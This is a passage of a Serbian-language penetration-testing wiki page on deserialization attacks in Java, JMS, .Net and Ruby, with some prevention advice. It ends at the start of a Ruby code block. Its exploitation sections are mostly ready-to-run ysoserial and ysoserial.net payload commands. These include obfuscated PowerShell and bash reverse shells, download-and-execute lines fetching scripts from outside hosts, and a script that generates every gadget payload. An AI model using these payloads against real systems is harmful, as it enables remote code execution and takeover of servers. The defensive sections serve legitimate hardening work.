Ako pronaƒëete java serijalizovani objekat koji se ≈°alje veb aplikaciji, mo≈æete koristiti [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) da biste ispisali serijalizovani objekat u formatu koji je ƒçitljiviji ƒçoveku. Poznavanje podataka koje ≈°aljete olak≈°avaƒáe vam izmenu i zaobila≈æenje nekih provera.

### **Eksploatacija**

#### **ysoserial**

Glavni alat za eksploataciju Java deserializacija je [**ysoserial**](https://github.com/frohoff/ysoserial) ([**preuzmite ovde**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Takoƒëe mo≈æete razmotriti kori≈°ƒáenje [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) koji ƒáe vam omoguƒáiti kori≈°ƒáenje slo≈æenih komandi (sa cevima, na primer).\
Imajte na umu da je ovaj alat **usmeren** na iskori≈°ƒáavanje **`ObjectInputStream`**.\
Predla≈æem da **prvo koristite payload "URLDNS"** pre RCE payloada da biste testirali da li je ubrizgavanje moguƒáe. U svakom sluƒçaju, imajte na umu da "URLDNS" payload mo≈æda ne radi, ali drugi RCE payload mo≈æe.

```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```

Kada kreirate payload za **java.lang.Runtime.exec()**, **ne mo≈æete koristiti posebne karaktere** poput ">" ili "|" za preusmjeravanje izlaza izvr≈°enja, "$()" za izvr≈°avanje komandi ili ƒçak **prosljeƒëivanje argumenata** komandi odvojenih **razmacima** (mo≈æete koristiti `echo -n "hello world"`, ali ne mo≈æete koristiti `python2 -c 'print "Hello world"'`). Da biste pravilno enkodovali payload, mo≈æete [koristiti ovu veb stranicu](http://www.jackson-t.ca/runtime-exec-payloads.html).

Slobodno koristite sledeƒái skript za kreiranje **svih moguƒáih payloada za izvr≈°avanje koda** za Windows i Linux, a zatim ih testirajte na ranjivoj veb stranici:

```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```

#### serialkillerbypassgadgets

Mo≈æete **koristiti** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **zajedno sa ysoserialom da biste kreirali vi≈°e eksploata**. Vi≈°e informacija o ovom alatu mo≈æete pronaƒái u **prezentaciji** gde je alat predstavljen: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) mo≈æe se koristiti za generisanje payloada za iskori≈°ƒáavanje razliƒçitih biblioteka za serijalizaciju **Json** i **Yml** u Javi.\
Da biste kompajlirali projekat, morao sam **dodati** ove **zavisnosti** u `pom.xml` fajl:

```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```

**Instalirajte Maven** i **kompajlirajte** projekat:

```bash
sudo apt-get install maven
mvn clean package -DskipTests
```

#### FastJSON

Proƒçitajte vi≈°e o ovoj Java JSON biblioteci: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratorije

* Ako ≈æelite da testirate neke ysoserial payloade, mo≈æete **pokrenuti ovu web aplikaciju**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Za≈°to

Java ƒçesto koristi serijalizaciju u razne svrhe kao ≈°to su:

* **HTTP zahtevi**: Serijalizacija se ≈°iroko koristi u upravljanju parametrima, ViewState-om, kolaƒçiƒáima, itd.
* **RMI (Remote Method Invocation)**: Java RMI protokol, koji se u potpunosti oslanja na serijalizaciju, je osnova za udaljenu komunikaciju u Java aplikacijama.
* **RMI preko HTTP-a**: Ovaj metod se ƒçesto koristi u Java baziranim debelim klijentskim veb aplikacijama, koristeƒái serijalizaciju za sve komunikacije objekata.
* **JMX (Java Management Extensions)**: JMX koristi serijalizaciju za prenos objekata preko mre≈æe.
* **Prilagoƒëeni protokoli**: U Javi, standardna praksa ukljuƒçuje prenos sirovih Java objekata, ≈°to ƒáe biti prikazano u buduƒáim primerima eksploatacije.

### Prevencija

#### Privremeni objekti

Klasa koja implementira `Serializable` mo≈æe oznaƒçiti bilo koji objekat unutar klase kao `transient` ako taj objekat ne treba biti serijalizovan. Na primer:

```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```

#### Izbegavajte serijalizaciju klase koja mora da implementira Serializable

U scenarijima gde odreƒëeni **objekti moraju da implementiraju interfejs `Serializable`** zbog hijerarhije klasa, postoji rizik od nenamernog deserijalizovanja. Da biste to spreƒçili, obezbedite da ovi objekti nisu deserijalizovani definisanjem `final` `readObject()` metode koja dosledno izaziva izuzetak, kao ≈°to je prikazano u primeru ispod:

```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```

#### **Unapreƒëivanje sigurnosti deserijalizacije u Javi**

**Prilagoƒëavanje `java.io.ObjectInputStream`** je praktiƒçan pristup za obezbeƒëivanje procesa deserijalizacije. Ova metoda je pogodna kada:

* Kod deserijalizacije je pod va≈°om kontrolom.
* Klase oƒçekivane za deserijalizaciju su poznate.

Preklopite metodu **`resolveClass()`** kako biste ograniƒçili deserijalizaciju samo na dozvoljene klase. Ovo spreƒçava deserijalizaciju bilo koje klase osim onih eksplicitno dozvoljenih, kao ≈°to je prikazano u sledeƒáem primeru koji ograniƒçava deserijalizaciju samo na klasu `Bicycle`:

```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```

**Kori≈°ƒáenje Java agenta za pobolj≈°anje bezbednosti** nudi alternativno re≈°enje kada modifikacija koda nije moguƒáa. Ova metoda se primenjuje uglavnom za **crnu listu ≈°tetnih klasa**, koristeƒái JVM parametar:

```
-javaagent:name-of-agent.jar
```

Pru≈æa naƒçin za dinamiƒçko osiguranje deserijalizacije, idealno za okru≈æenja u kojima su trenutne promene koda nepraktiƒçne.

Pogledajte primer u [rO0 od Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementiranje filtera za serijalizaciju**: Java 9 je uvela filtere za serijalizaciju putem interfejsa **`ObjectInputFilter`**, pru≈æajuƒái moƒáan mehanizam za specificiranje kriterijuma koje serijalizovani objekti moraju zadovoljiti pre deserijalizacije. Ovi filteri se mogu primeniti globalno ili po toku, pru≈æajuƒái granularnu kontrolu nad procesom deserijalizacije.

Da biste koristili filtere za serijalizaciju, mo≈æete postaviti globalni filter koji se primenjuje na sve operacije deserijalizacije ili ga dinamiƒçki konfigurisati za odreƒëene tokove. Na primer:

```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```

**Iskori≈°ƒáavanje spoljnih biblioteka za pobolj≈°anu sigurnost**: Biblioteke poput **NotSoSerial**, **jdeserialize** i **Kryo** nude napredne funkcionalnosti za kontrolu i praƒáenje Java deserijalizacije. Ove biblioteke mogu pru≈æiti dodatne slojeve sigurnosti, poput bele≈æenja ili blokiranja klasa, analize serijalizovanih objekata pre deserijalizacije i implementacije prilagoƒëenih strategija serijalizacije.

* **NotSoSerial** presreƒáe procese deserijalizacije kako bi spreƒçio izvr≈°avanje nepouzdanog koda.
* **jdeserialize** omoguƒáava analizu serijalizovanih Java objekata bez deserijalizacije, poma≈æuƒái u identifikaciji potencijalno zlonamernog sadr≈æaja.
* **Kryo** je alternativni okvir za serijalizaciju koji nagla≈°ava brzinu i efikasnost, nudeƒái konfigurabilne strategije serijalizacije koje mogu pobolj≈°ati sigurnost.

### Reference

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Saznajte ≈°ta je **JNDI Injection, kako ga zloupotrebiti putem RMI, CORBA i LDAP-a i kako iskoristiti log4shell** (i primer ove ranjivosti) na sledeƒáoj stranici:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> Java Message Service (JMS) API je Java API za poruke usmerene na poruke za slanje poruka izmeƒëu dva ili vi≈°e klijenata. To je implementacija za re≈°avanje problema proizvoƒëaƒça-potro≈°aƒça. JMS je deo Java Platform, Enterprise Edition (Java EE) i definisan je specifikacijom koju je razvio Sun Microsystems, ali koju je od tada vodio Java Community Process. To je standard za razmenu poruka koji omoguƒáava komponentama aplikacija zasnovanim na Java EE da kreiraju, ≈°alju, primaju i ƒçitaju poruke. Omoguƒáava komunikaciju izmeƒëu razliƒçitih komponenti distribuirane aplikacije da bude slabo povezana, pouzdana i asinhrona. (Iz [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Proizvodi

Postoji nekoliko proizvoda koji koriste ovaj middleware za slanje poruka:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### Eksploatacija

Dakle, u osnovi postoji **niz usluga koje koriste JMS na opasan naƒçin**. Dakle, ako imate **dovoljno privilegija** za slanje poruka tim uslugama (obiƒçno ƒáe vam biti potrebne validne akreditacije), mo≈æete poslati **zlonamerne objekte serijalizovane koji ƒáe biti deserijalizovani od strane potro≈°aƒça/pretplatnika**.\
To znaƒçi da ƒáe svi **klijenti koji ƒáe koristiti tu poruku biti zara≈æeni**.

Trebali biste zapamtiti da ƒçak i ako je usluga ranjiva (jer nesigurno deserijalizuje korisniƒçki unos), i dalje morate pronaƒái validne gadgete za iskori≈°ƒáavanje ranjivosti.

Alatka [JMET](https://github.com/matthiaskaiser/jmet) je kreirana kako bi se **povezala i napala ove usluge slanjem nekoliko zlonamernih objekata serijalizovanih koristeƒái poznate gadgete**. Ovi napadi ƒáe uspeti ako je usluga i dalje ranjiva i ako se neki od kori≈°ƒáenih gadgeta nalazi unutar ranjive aplikacije.

### Reference

* JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

U kontekstu .Net-a, eksploatacija deserijalizacije funkcioni≈°e na sliƒçan naƒçin kao u Javi, gde se gadgeti iskori≈°ƒáavaju kako bi se izvr≈°io odreƒëeni kod tokom deserijalizacije objekta.

### Fingerprint

#### WhiteBox

Izvorni kod treba biti pregledan u potrazi za pojavama:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Fokus treba biti na serializerima koji omoguƒáavaju odreƒëivanje tipa putem promenljive kojom korisnik upravlja.

#### BlackBox

Pretraga treba ciljati Base64 kodiranu nisku **AAEAAAD/////** ili bilo koji sliƒçan obrazac koji bi mogao biti podvrgnut deserializaciji na serverskoj strani, dajuƒái kontrolu nad tipom koji ƒáe biti deserializovan. Ovo mo≈æe ukljuƒçivati, ali nije ograniƒçeno na, **JSON** ili **XML** strukture koje sadr≈æe `TypeObject` ili `$type`.

### ysoserial.net

U ovom sluƒçaju mo≈æete koristiti alat [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) kako biste **kreirali deserializacijske eksploate**. Nakon preuzimanja git repozitorijuma, trebali biste **kompajlirati alat** koristeƒái na primer Visual Studio.

Ako ≈æelite da saznate **kako ysoserial.net kreira svoj eksploit**, mo≈æete [**proveriti ovu stranicu gde je obja≈°njen ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Glavne opcije **ysoserial.net** su: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

* **`--gadget`** se koristi da se naznaƒçi gadget koji ƒáe biti zloupotrebljen (naznaƒçiti klasu/funkciju koja ƒáe biti zloupotrebljena tokom deserializacije radi izvr≈°avanja komandi).
* **`--formatter`**, koristi se da se naznaƒçi metoda za serijalizaciju eksploita (trebate znati koju biblioteku koristi pozadina za deserializaciju payloada i koristiti istu za serijalizaciju).
* **`--output`** se koristi da se naznaƒçi da li ≈æelite eksploit u **sirovom** ili **Base64** kodiranom formatu. _Imajte na umu da ƒáe **ysoserial.net** kodirati payload koristeƒái **UTF-16LE** (podrazumevano kodiranje na Windowsu), pa ako dobijete sirovi format i samo ga kodirate sa linux konzole, mo≈æda ƒáete imati neke **probleme sa kompatibilno≈°ƒáu kodiranja** koji ƒáe spreƒçiti ispravno funkcionisanje eksploita (u HTB JSON kutiji payload je radio i u UTF-16LE i ASCII, ali to ne znaƒçi da ƒáe uvek raditi)._
* **`--plugin`** ysoserial.net podr≈æava dodatke za izradu **eksploita za odreƒëene okvire** kao ≈°to je ViewState

#### Vi≈°e parametara ysoserial.net

* `--minify` ƒáe pru≈æiti **manji payload** (ako je moguƒáe)
* `--raf -f Json.Net -c "anything"` Ovo ƒáe naznaƒçiti sve gad≈æete koji se mogu koristiti sa odreƒëenim formatterom (`Json.Net` u ovom sluƒçaju)
* `--sf xml` mo≈æete **naznaƒçiti gad≈æet** (`-g`) i ysoserial.net ƒáe tra≈æiti formate koji sadr≈æe "xml" (bez obzira na veliƒçinu slova)

**ysoserial primeri** za kreiranje eksploita:

```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```

**ysoserial.net** takoƒëe ima **vrlo interesantan parametar** koji poma≈æe da se bolje razume kako svaki exploit funkcioni≈°e: `--test`\
Ako navedete ovaj parametar, **ysoserial.net** ƒáe **poku≈°ati** exploit lokalno, tako da mo≈æete testirati da li ƒáe va≈° payload pravilno raditi.\
Ovaj parametar je koristan jer ako pregledate kod, pronaƒái ƒáete delove koda poput sledeƒáeg (iz [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):

```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```

Ovo znaƒçi da bi se testirao exploit, kod ƒáe pozvati [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) funkciju.

```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```

U **prethodnom kodu postoji ranjivost koju je moguƒáe iskoristiti**. Dakle, ako pronaƒëete ne≈°to sliƒçno u .Net aplikaciji, to znaƒçi da je ta aplikacija verovatno ranjiva.\
Stoga, **`--test`** parametar nam omoguƒáava da razumemo **koji delovi koda su ranjivi** na deserializacijski napad koji mo≈æe stvoriti **ysoserial.net**.

### ViewState

Pogledajte [ovaj POST o **kako poku≈°ati iskoristiti \_\_ViewState parametar u .Net-u**](exploiting-\_\_viewstate-parameter.md) da biste **izvr≈°ili proizvoljni kod**. Ako **veƒá znate tajne** koje koristi ciljna ma≈°ina, [**proƒçitajte ovaj post da biste saznali kako izvr≈°iti kod**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevencija

Da biste smanjili rizike povezane sa deserializacijom u .Net-u:

* **Izbegavajte dozvoljavanje da podaci defini≈°u svoje tipove objekata**. Koristite `DataContractSerializer` ili `XmlSerializer` kada je to moguƒáe.
* **Za `JSON.Net`, postavite `TypeNameHandling` na `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Izbegavajte kori≈°ƒáenje `JavaScriptSerializer` sa `JavaScriptTypeResolver`-om.**
* **Ograniƒçite tipove koji mogu biti deserializovani**, razumevajuƒái inherentne rizike sa .Net tipovima, kao ≈°to je `System.IO.FileInfo`, koji mo≈æe menjati osobine serverskih fajlova, ≈°to mo≈æe dovesti do napada uskraƒáivanja usluge.
* **Budite oprezni sa tipovima koji imaju riziƒçne osobine**, kao ≈°to je `System.ComponentModel.DataAnnotations.ValidationException` sa svojom `Value` osobinom, koja mo≈æe biti iskori≈°ƒáena.
* **Sigurno kontroli≈°ite instanciranje tipova** kako biste spreƒçili napadaƒçe da utiƒçu na proces deserializacije, ƒçime se ƒçak i `DataContractSerializer` ili `XmlSerializer` ƒçine ranjivim.
* **Implementirajte kontrolu bele liste** koristeƒái prilagoƒëeni `SerializationBinder` za `BinaryFormatter` i `JSON.Net`.
* **Budite informisani o poznatim nesigurnim deserializacijskim gadgetima** u okviru .Net-a i obezbedite da deserializatori ne instanciraju takve tipove.
* **Izolujte potencijalno riziƒçan kod** od koda sa pristupom internetu kako biste izbegli izlaganje poznatih gadgeta, poput `System.Windows.Data.ObjectDataProvider` u WPF aplikacijama, nepouzdanim izvorima podataka.

### **Reference**

* Java i .Net JSON deserializacija **rad:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** predavanje: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

U Ruby-ju, serijalizacija se olak≈°ava pomoƒáu dve metode unutar **marshal** biblioteke. Prva metoda, poznata kao **dump**, koristi se za pretvaranje objekta u niz bajtova. Ovaj proces se naziva serijalizacija. S druge strane, druga metoda, **load**, koristi se za vraƒáanje niza bajtova u objekat, proces poznat kao deserijalizacija.

Za obezbeƒëivanje serijalizovanih objekata, **Ruby koristi HMAC (Hash-Based Message Authentication Code)**, obezbeƒëujuƒái integritet i autentiƒçnost podataka. Kljuƒç koji se koristi u tu svrhu ƒçuva se na jednom od nekoliko moguƒáih lokacija:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X generiƒçki deserializacija u RCE gadget lanac (vi≈°e informacija na** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:

```ruby
#!/usr/bin/env ruby

